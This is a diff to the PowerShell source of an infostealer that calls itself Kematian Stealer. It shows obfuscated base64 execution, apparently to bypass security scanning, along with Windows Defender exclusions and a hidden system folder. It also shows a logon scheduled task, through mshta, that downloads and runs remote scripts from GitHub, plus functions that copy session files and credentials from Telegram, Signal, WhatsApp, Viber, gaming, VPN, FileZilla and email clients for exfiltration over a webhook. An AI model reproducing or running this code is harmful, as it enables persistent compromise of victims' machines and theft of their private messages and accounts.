@@ -1,11 +1,17 @@
 $webhook = "YOUR_WEBHOOK_HERE" 
 $debug = $false
-$autoupdate = $false
 $blockhostsfile = $true
 $criticalprocess = $true
 $melt = $false
 $fakeerror = $false
 $persistence = $true
+
+$settings = $false
+
+if (Test-Path -Path "$env:APPDATA\Kematian\settings.ps1") {
+    $settings = $true
+    . "$env:APPDATA\Kematian\settings.ps1"
+}
 
 if ($debug) {
     $ProgressPreference = 'Continue'
@@ -65,6 +71,44 @@ function CHECK_AND_PATCH {
     ${CHaINSki} = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("JGtkb3QuU2V0VmFsdWUoJG51bGwsJHRydWUp")) | &([regex]::Unescape("\u0069\u0065\u0078"))
     $kdotcheck = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
     return $kdotcheck
+}
+
+function Invoke-TASKS {
+    Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp" -Force
+    if ($persistence) {
+        Add-MpPreference -ExclusionPath "$env:APPDATA\Kematian" -Force
+        New-Item -ItemType Directory -Path "$env:APPDATA\Kematian" -Force | Out-Null
+        if (-not ($settings)) {
+            $settings = @"
+`$debug = `$$debug
+`$blockhostsfile = `$$blockhostsfile
+`$criticalprocess = `$$criticalprocess
+`$melt = `$$melt
+`$fakeerror = `$$fakeerror
+`$persistence = `$$persistence
+"@
+
+        }
+        # Hidden Directory
+        $KDOT_DIR = get-item "$env:APPDATA\Kematian" -Force
+        $KDOT_DIR.attributes = "Hidden", "System"
+        $task_name = "Kematian"
+        if ($debug) {
+            $task_action = New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-ExecutionPolicy Bypass -C `"`$webhook = '$webhook' ; iwr https://raw.githubusercontent.com/ChildrenOfYahweh/Kematian-Stealer/main/frontend-src/autorun.ps1 | iex`""
+        }
+        else {
+            $task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$webhook='$webhook';iwr('https://raw.githubusercontent.com/ChildrenOfYahweh/Kematian-Stealer/main/frontend-src/autorun.ps1')|iex`",0)(window.close)"
+        }
+        $task_trigger = New-ScheduledTaskTrigger -AtLogOn
+        $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
+        Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "Kematian" -RunLevel Highest -Force
+        Write-Host "[!] Task Created" -ForegroundColor Green
+    }
+    if ($blockhostsfile) {
+        $link = ("https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/blockhosts.ps1")
+        iex (iwr -uri $link -useb)
+    }
+    Backup-Data
 }
 
 function VMPROTECT {
@@ -289,33 +333,42 @@ function Backup-Data {
 
     # All Messaging Sessions
 	
-	# Telegram Session
+    # Telegram Session
     function telegramstealer {
-	$processname = "telegram"
-	$pathtele = "$env:userprofile\AppData\Roaming\Telegram Desktop\tdata"
-	if (!(Test-Path $pathtele)) { return }
-	$telegramProcess = Get-Process -Name $processname -ErrorAction SilentlyContinue
-    if ($telegramProcess) {$telegramPID = $telegramProcess.Id; $telegramPath = (gwmi Win32_Process -Filter "ProcessId = $telegramPID").CommandLine.split('"')[1]
-    Stop-Process -Id $telegramPID -Force
-    }
-    $telegramsession = Join-Path $folder_messaging "Telegram"
-	New-Item -ItemType Directory -Force -Path $telegramsession | Out-Null
-    $items = Get-ChildItem -Path $pathtele
-    foreach ($item in $items) {
-    if ($item.GetType() -eq [System.IO.FileInfo]) {
-    if (($item.Name.EndsWith("s") -and $item.Length -lt 200KB) -or
+        $processname = "telegram"
+        $pathtele = "$env:userprofile\AppData\Roaming\Telegram Desktop\tdata"
+        if (!(Test-Path $pathtele)) { return }
+        $telegramProcess = Get-Process -Name $processname -ErrorAction SilentlyContinue
+        if ($telegramProcess) {
+            $telegramPID = $telegramProcess.Id; $telegramPath = (gwmi Win32_Process -Filter "ProcessId = $telegramPID").CommandLine.split('"')[1]
+            Stop-Process -Id $telegramPID -Force
+        }
+        $telegramsession = Join-Path $folder_messaging "Telegram"
+        New-Item -ItemType Directory -Force -Path $telegramsession | Out-Null
+        $items = Get-ChildItem -Path $pathtele
+        foreach ($item in $items) {
+            if ($item.GetType() -eq [System.IO.FileInfo]) {
+                if (($item.Name.EndsWith("s") -and $item.Length -lt 200KB) -or
     ($item.Name.StartsWith("key_data") -or $item.Name.StartsWith("settings") -or $item.Name.StartsWith("configs") -or $item.Name.StartsWith("maps"))) {
-    Copy-Item -Path $item.FullName -Destination $telegramsession -Force }}
-    elseif ($item.GetType() -eq [System.IO.DirectoryInfo]) {
-    if ($item.Name.Length -eq 16) {
-    $files = Get-ChildItem -Path $item.FullName -File             
-    foreach ($file in $files) {
-    if ($file.Name.EndsWith("s") -and $file.Length -lt 200KB) {
-    $destinationDirectory = Join-Path -Path $telegramsession -ChildPath $item.Name
-    if (-not (Test-Path -Path $destinationDirectory -PathType Container)) {
-    New-Item -ItemType Directory -Path $destinationDirectory | Out-Null }
-    Copy-Item -Path $file.FullName -Destination $destinationDirectory -Force }}}}}
-    try { (Start-Process -FilePath $telegramPath) } catch {}   
+                    Copy-Item -Path $item.FullName -Destination $telegramsession -Force 
+                }
+            }
+            elseif ($item.GetType() -eq [System.IO.DirectoryInfo]) {
+                if ($item.Name.Length -eq 16) {
+                    $files = Get-ChildItem -Path $item.FullName -File             
+                    foreach ($file in $files) {
+                        if ($file.Name.EndsWith("s") -and $file.Length -lt 200KB) {
+                            $destinationDirectory = Join-Path -Path $telegramsession -ChildPath $item.Name
+                            if (-not (Test-Path -Path $destinationDirectory -PathType Container)) {
+                                New-Item -ItemType Directory -Path $destinationDirectory | Out-Null 
+                            }
+                            Copy-Item -Path $file.FullName -Destination $destinationDirectory -Force 
+                        }
+                    }
+                }
+            }
+        }
+        try { (Start-Process -FilePath $telegramPath) } catch {}   
     }
     telegramstealer
 
@@ -328,7 +381,7 @@ function Backup-Data {
         New-Item -ItemType Directory -Force -Path $element_session | Out-Null
         Copy-Item -Path "$elementfolder\IndexedDB" -Destination $element_session -Recurse -force 
         Copy-Item -Path "$elementfolder\Local Storage" -Destination $element_session -Recurse -force 
-        }
+    }
     elementstealer
 
 
@@ -340,7 +393,7 @@ function Backup-Data {
         New-Item -ItemType Directory -Force -Path $icq_session | Out-Null
         Copy-Item -Path "$icqfolder\0001" -Destination $icq_session -Recurse -force 
     }
-	icqstealer
+    icqstealer
 
 
     # Signal Session 
@@ -350,7 +403,7 @@ function Backup-Data {
         $signal_session = "$folder_messaging\Signal"
         New-Item -ItemType Directory -Force -Path $signal_session | Out-Null
         Copy-Item -Path "$signalfolder\sql" -Destination $signal_session -Recurse -force
-		Copy-Item -Path "$signalfolder\attachments.noindex" -Destination $signal_session -Recurse -force
+        Copy-Item -Path "$signalfolder\attachments.noindex" -Destination $signal_session -Recurse -force
         Copy-Item -Path "$signalfolder\config.json" -Destination $signal_session -Recurse -force
     } 
     signalstealer
@@ -358,45 +411,49 @@ function Backup-Data {
 
     # Viber Session 
     function viberstealer {
-    $viberfolder = "$env:userprofile\AppData\Roaming\ViberPC"
-    if (!(Test-Path $viberfolder)) { return }
-    $viber_session = "$folder_messaging\Viber"
-    New-Item -ItemType Directory -Force -Path $viber_session | Out-Null
-    $pattern = "^([\+|0-9][0-9.]{1,12})$"
-    $directories = Get-ChildItem -Path $viberfolder -Directory | Where-Object { $_.Name -match $pattern }
-    $rootFiles = Get-ChildItem -Path $viberfolder -File | Where-Object { $_.Name -match "(?i)\.db$|\.db-wal$" }
-    foreach ($rootFile in $rootFiles) {Copy-Item -Path $rootFile.FullName -Destination $viber_session -Force }    
-    foreach ($directory in $directories) {
-    $destinationPath = Join-Path -Path $viber_session -ChildPath $directory.Name
-    Copy-Item -Path $directory.FullName -Destination $destinationPath -Force        
-    $files = Get-ChildItem -Path $directory.FullName -File -Recurse -Include "*.db", "*.db-wal" | Where-Object { -not $_.PSIsContainer }
-    foreach ($file in $files) {
-    $destinationPathFiles = Join-Path -Path $destinationPath -ChildPath $file.Name
-    Copy-Item -Path $file.FullName -Destination $destinationPathFiles -Force
-    }
-    }
+        $viberfolder = "$env:userprofile\AppData\Roaming\ViberPC"
+        if (!(Test-Path $viberfolder)) { return }
+        $viber_session = "$folder_messaging\Viber"
+        New-Item -ItemType Directory -Force -Path $viber_session | Out-Null
+        $pattern = "^([\+|0-9][0-9.]{1,12})$"
+        $directories = Get-ChildItem -Path $viberfolder -Directory | Where-Object { $_.Name -match $pattern }
+        $rootFiles = Get-ChildItem -Path $viberfolder -File | Where-Object { $_.Name -match "(?i)\.db$|\.db-wal$" }
+        foreach ($rootFile in $rootFiles) { Copy-Item -Path $rootFile.FullName -Destination $viber_session -Force }    
+        foreach ($directory in $directories) {
+            $destinationPath = Join-Path -Path $viber_session -ChildPath $directory.Name
+            Copy-Item -Path $directory.FullName -Destination $destinationPath -Force        
+            $files = Get-ChildItem -Path $directory.FullName -File -Recurse -Include "*.db", "*.db-wal" | Where-Object { -not $_.PSIsContainer }
+            foreach ($file in $files) {
+                $destinationPathFiles = Join-Path -Path $destinationPath -ChildPath $file.Name
+                Copy-Item -Path $file.FullName -Destination $destinationPathFiles -Force
+            }
+        }
     }
     viberstealer
 
 
     # Whatsapp Session 
     function whatsappstealer {
-    $whatsapp_session = "$folder_messaging\Whatsapp"
-    New-Item -ItemType Directory -Force -Path $whatsapp_session | Out-Null
-    $regexPattern = "^[a-z0-9]+\.WhatsAppDesktop_[a-z0-9]+$"
-    $parentFolder = Get-ChildItem -Path "$env:localappdata\Packages" -Directory | Where-Object { $_.Name -match $regexPattern }
-    if ($parentFolder) {
-    $localStateFolders = Get-ChildItem -Path $parentFolder.FullName -Filter "LocalState" -Recurse -Directory
-    foreach ($localStateFolder in $localStateFolders) {
-    $profilePicturesFolder = Get-ChildItem -Path $localStateFolder.FullName -Filter "profilePictures" -Recurse -Directory
-    if ($profilePicturesFolder) {
-    $destinationPath = Join-Path -Path $whatsapp_session -ChildPath $localStateFolder.Name
-    $profilePicturesDestination = Join-Path -Path $destinationPath -ChildPath "profilePictures"
-    Copy-Item -Path $profilePicturesFolder.FullName -Destination $profilePicturesDestination -Recurse -ErrorAction SilentlyContinue}}
-    foreach ($localStateFolder in $localStateFolders) {
-    $filesToCopy = Get-ChildItem -Path $localStateFolder.FullName -File | Where-Object { $_.Length -le 10MB -and $_.Name -match "(?i)\.db$|\.db-wal|\.dat$" }
-    $destinationPath = Join-Path -Path $whatsapp_session -ChildPath $localStateFolder.Name
-    Copy-Item -Path $filesToCopy.FullName -Destination $destinationPath -Recurse }}
+        $whatsapp_session = "$folder_messaging\Whatsapp"
+        New-Item -ItemType Directory -Force -Path $whatsapp_session | Out-Null
+        $regexPattern = "^[a-z0-9]+\.WhatsAppDesktop_[a-z0-9]+$"
+        $parentFolder = Get-ChildItem -Path "$env:localappdata\Packages" -Directory | Where-Object { $_.Name -match $regexPattern }
+        if ($parentFolder) {
+            $localStateFolders = Get-ChildItem -Path $parentFolder.FullName -Filter "LocalState" -Recurse -Directory
+            foreach ($localStateFolder in $localStateFolders) {
+                $profilePicturesFolder = Get-ChildItem -Path $localStateFolder.FullName -Filter "profilePictures" -Recurse -Directory
+                if ($profilePicturesFolder) {
+                    $destinationPath = Join-Path -Path $whatsapp_session -ChildPath $localStateFolder.Name
+                    $profilePicturesDestination = Join-Path -Path $destinationPath -ChildPath "profilePictures"
+                    Copy-Item -Path $profilePicturesFolder.FullName -Destination $profilePicturesDestination -Recurse -ErrorAction SilentlyContinue
+                }
+            }
+            foreach ($localStateFolder in $localStateFolders) {
+                $filesToCopy = Get-ChildItem -Path $localStateFolder.FullName -File | Where-Object { $_.Length -le 10MB -and $_.Name -match "(?i)\.db$|\.db-wal|\.dat$" }
+                $destinationPath = Join-Path -Path $whatsapp_session -ChildPath $localStateFolder.Name
+                Copy-Item -Path $filesToCopy.FullName -Destination $destinationPath -Recurse 
+            }
+        }
     }
     whatsappstealer
 
@@ -408,7 +465,7 @@ function Backup-Data {
         New-Item -ItemType Directory -Force -Path $skype_session | Out-Null
         Copy-Item -Path "$skypefolder\Local Storage" -Destination $skype_session -Recurse -force
     }
-	skype_stealer
+    skype_stealer
 	
     function pidgin_stealer {
         $pidgin_folder = "$env:userprofile\AppData\Roaming\.purple"
@@ -417,7 +474,7 @@ function Backup-Data {
         New-Item -ItemType Directory -Force -Path $pidgin_accounts | Out-Null
         Copy-Item -Path "$pidgin_folder\accounts.xml" -Destination $pidgin_accounts -Recurse -force 
     }
-	pidgin_stealer
+    pidgin_stealer
 
     # All Gaming Sessions
 	
@@ -433,7 +490,7 @@ function Backup-Data {
             Get-ChildItem -path $steamfolder -Filter ([regex]::escape($file) + "*") -Recurse -File | ForEach-Object { Copy-Item -path $PSItem.FullName -Destination $steam_session }
         }
     }
-	steamstealer
+    steamstealer
 
 
     # Minecraft Session Stealer
@@ -446,7 +503,7 @@ function Backup-Data {
         Get-ChildItem $minecraftfolder1 -Include "*.json" -Recurse | Copy-Item -Destination $minecraft_session 
         Get-ChildItem $minecraftfolder2 -Include "*.json" -Recurse | Copy-Item -Destination $minecraft_session 
     }
-	minecraftstealer
+    minecraftstealer
 
     # Epicgames Session Stealer
     function epicgames_stealer {
@@ -458,7 +515,7 @@ function Backup-Data {
         Copy-Item -Path "$epicgamesfolder\Saved\Logs" -Destination $epicgames_session -Recurse -force
         Copy-Item -Path "$epicgamesfolder\Saved\Data" -Destination $epicgames_session -Recurse -force
     }
-	epicgames_stealer
+    epicgames_stealer
 
     # Ubisoft Session Stealer
     function ubisoftstealer {
@@ -468,29 +525,29 @@ function Backup-Data {
         New-Item -ItemType Directory -Force -Path $ubisoft_session | Out-Null
         Copy-Item -Path "$ubisoftfolder" -Destination $ubisoft_session -Recurse -force
     }
-	ubisoftstealer
+    ubisoftstealer
 
     # EA Session Stealer
     function electronic_arts {
-    $eafolder = "$env:localappdata\Electronic Arts\EA Desktop\CEF"
-    if (!(Test-Path $eafolder)) { return }
-    $ea_session = "$folder_gaming\Electronic Arts"
-    New-Item -ItemType Directory -Path $ea_session -Force | Out-Null
-    $parentDirName = (Get-Item $eafolder).Parent.Name
-    $destination = Join-Path $ea_session $parentDirName
-    New-Item -ItemType Directory -Path $destination -Force | Out-Null
-    Copy-Item -Path $eafolder -Destination $destination -Recurse -Force
+        $eafolder = "$env:localappdata\Electronic Arts\EA Desktop\CEF"
+        if (!(Test-Path $eafolder)) { return }
+        $ea_session = "$folder_gaming\Electronic Arts"
+        New-Item -ItemType Directory -Path $ea_session -Force | Out-Null
+        $parentDirName = (Get-Item $eafolder).Parent.Name
+        $destination = Join-Path $ea_session $parentDirName
+        New-Item -ItemType Directory -Path $destination -Force | Out-Null
+        Copy-Item -Path $eafolder -Destination $destination -Recurse -Force
     }
     electronic_arts
 
     # Growtopia Stealer
     function growtopiastealer {
-    $growtopiafolder = "$env:localappdata\Growtopia"
-    if (!(Test-Path $growtopiafolder)) { return }
-    $growtopia_session = "$folder_gaming\Growtopia"
-    New-Item -ItemType Directory -Force -Path $growtopia_session | Out-Null
-    $save_file = "$growtopiafolder\save.dat"
-    if (Test-Path $save_file) {Copy-Item -Path $save_file -Destination $growtopia_session} 
+        $growtopiafolder = "$env:localappdata\Growtopia"
+        if (!(Test-Path $growtopiafolder)) { return }
+        $growtopia_session = "$folder_gaming\Growtopia"
+        New-Item -ItemType Directory -Force -Path $growtopia_session | Out-Null
+        $save_file = "$growtopiafolder\save.dat"
+        if (Test-Path $save_file) { Copy-Item -Path $save_file -Destination $growtopia_session } 
     }
     growtopiastealer
 
@@ -504,7 +561,7 @@ function Backup-Data {
             Copy-Item -Path $file.FullName -Destination $battle_session
         }
     }
-	battle_net_stealer
+    battle_net_stealer
 
 
     # All VPN Sessions
@@ -534,16 +591,16 @@ function Backup-Data {
         New-Item -ItemType Directory -Force -Path $surfsharkvpn_account | Out-Null
         Get-ChildItem $surfsharkvpnfolder -Include @("data.dat", "settings.dat", "settings-log.dat", "private_settings.dat") -Recurse | Copy-Item -Destination $surfsharkvpn_account
     }
-	surfsharkvpnstealer
+    surfsharkvpnstealer
 	
-	# OpenVPN 
+    # OpenVPN 
     function openvpn_stealer {
         $openvpnfolder = "$env:userprofile\AppData\Roaming\OpenVPN Connect"
         if (!(Test-Path $openvpnfolder)) { return }
         $openvpn_accounts = "$folder_vpn\OpenVPN"
         New-Item -ItemType Directory -Force -Path $openvpn_accounts | Out-Null
         Copy-Item -Path "$openvpnfolder\profiles" -Destination $openvpn_accounts -Recurse -force 
-		Copy-Item -Path "$openvpnfolder\config.json" -Destination $openvpn_accounts -Recurse -force 
+        Copy-Item -Path "$openvpnfolder\config.json" -Destination $openvpn_accounts -Recurse -force 
     }
     openvpn_stealer
 
@@ -595,7 +652,7 @@ Pass: $decodedPass
         }
         $serversInfo | Out-File -FilePath "$filezilla_hosts\Hosts.txt" -Force
     }
-	filezilla_stealer
+    filezilla_stealer
 
     # Thunderbird Exfil
     if (Test-Path -Path "$env:USERPROFILE\AppData\Roaming\Thunderbird\Profiles") {
@@ -1065,34 +1122,6 @@ FileZilla: $filezilla_info
     # cleanup
     Remove-Item "$env:LOCALAPPDATA\Temp\Kematian.zip" -Force
     Remove-Item "$folder_general" -Force -Recurse
-}
-
-function Invoke-TASKS {
-    Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp" -Force
-    if ($persistence) {
-        Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp" -Force
-        Add-MpPreference -ExclusionPath "$env:APPDATA\Kematian" -Force
-        New-Item -ItemType Directory -Path "$env:APPDATA\Kematian" -Force | Out-Null
-        # Hidden Directory
-        $KDOT_DIR = get-item "$env:APPDATA\Kematian" -Force
-        $KDOT_DIR.attributes = "Hidden", "System"
-        $task_name = "Kematian"
-        if ($debug) {
-        $task_action = New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-ExecutionPolicy Bypass -C `"`$webhook = '$webhook' ; iwr https://raw.githubusercontent.com/ChildrenOfYahweh/Kematian-Stealer/main/frontend-src/autorun.ps1 | iex`""
-        }
-        else {
-        $task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$webhook='$webhook';iwr('https://raw.githubusercontent.com/ChildrenOfYahweh/Kematian-Stealer/main/frontend-src/autorun.ps1')|iex`",0)(window.close)"
-        }
-        $task_trigger = New-ScheduledTaskTrigger -AtLogOn
-        $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
-        Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "Kematian" -RunLevel Highest -Force
-        Write-Host "[!] Task Created" -ForegroundColor Green
-    }
-    if ($blockhostsfile) {
-        $link = ("https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/blockhosts.ps1")
-        iex (iwr -uri $link -useb)
-    }
-    Backup-Data
 }
 
 if (CHECK_AND_PATCH -eq $true) {
